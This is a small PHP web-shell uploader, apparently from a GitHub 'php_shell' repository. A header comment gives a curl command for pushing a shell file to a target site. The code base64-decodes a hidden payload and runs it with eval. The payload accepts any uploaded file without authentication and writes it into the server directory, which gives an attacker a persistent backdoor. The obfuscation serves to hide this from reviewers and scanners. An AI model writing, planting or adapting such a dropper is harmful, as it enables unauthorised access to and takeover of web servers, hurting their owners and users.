<!-- 
################################################
|   https://github.com/hidayatimam/php_shell/  |
#################################################################
#   Description:   - Simple Shell Upload to                     #
#                       Server Using CURL                       #
#                           Command                             #
#   Usage       :  - CURL -K POST -F "file=@{{[PATH_SHELL]}}"   # 
#                   https://{{target.site}}/simpleUpload.php    #
#################################################################
 -->
<?php
$script= 'PD9waHAKICAgJHRhcmdldERpciA9IF9fRElSX18gLiAnLyc7CiAgIGlmIChpc3NldCgkX0ZJTEVTWydmaWxlJ10pKSB7CiAgICAgICAkdGFyZ2V0RmlsZSA9ICR0YXJnZXREaXIgLiBiYXNlbmFtZSgkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSk7CiAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJHRhcmdldEZpbGUpKSB7CiAgICAgICAgICAgZWNobyAiRG9uZSI7CiAgICAgICB9IGVsc2UgewogICAgICAgICAgIGVjaG8gIkZpbGUgTm90IEZvdW5kIjsKICAgICAgIH0KICAgfSBlbHNlIHsKICAgICAgIGVjaG8gIjQwNCI7CiAgIH0KPz4K';
$hajar = base64_decode($script);
eval('?>' . $hajar);
?>
